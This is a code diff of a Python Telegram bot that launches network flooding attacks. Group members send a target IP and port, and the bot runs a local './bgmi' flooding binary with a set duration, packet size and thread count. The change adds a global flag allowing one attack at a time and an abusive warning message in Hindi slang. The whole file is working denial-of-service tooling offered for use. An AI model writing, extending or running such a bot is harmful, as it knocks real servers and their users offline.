@@ -13,6 +13,7 @@ DEFAULT_DURATION = 120  # Set default duration
 
 users = {}
 user_processes = {}  # Dictionary to track processes for each user
+attack_running = False  # Global flag to check if an attack is running
 
 def load_users():
     try:
@@ -37,8 +38,14 @@ async def private_chat_warning(update: Update) -> None:
     await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global attack_running
+
     if not await is_group_chat(update):
         await private_chat_warning(update)
+        return
+
+    if attack_running:
+        await update.message.reply_text("⚠️ KYU BE LVDE TEREKO SAMAJH ME NHI ARA KYA EK ATTACK ALREADY CHALRA HA, 🤬WAIT KAR🤬 .")
         return
 
     user_id = str(update.message.from_user.id)
@@ -50,10 +57,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     target_ip = context.args[0]
     port = context.args[1]
 
-    if user_id in user_processes:
-        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
-        return
-
+    attack_running = True  # Set global flag to True
     flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
     
     # Start the attack in a separate background task
@@ -63,6 +67,8 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def run_attack(update: Update, command, user_id):
     """Run the attack in the background without blocking other bot commands."""
+    global attack_running
+
     process = subprocess.Popen(command)
     
     try:
@@ -74,6 +80,7 @@ async def run_attack(update: Update, command, user_id):
     finally:
         if user_id in user_processes:
             del user_processes[user_id]  # Cleanup after completion
+        attack_running = False  # Reset global flag after attack ends
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not await is_group_chat(update):
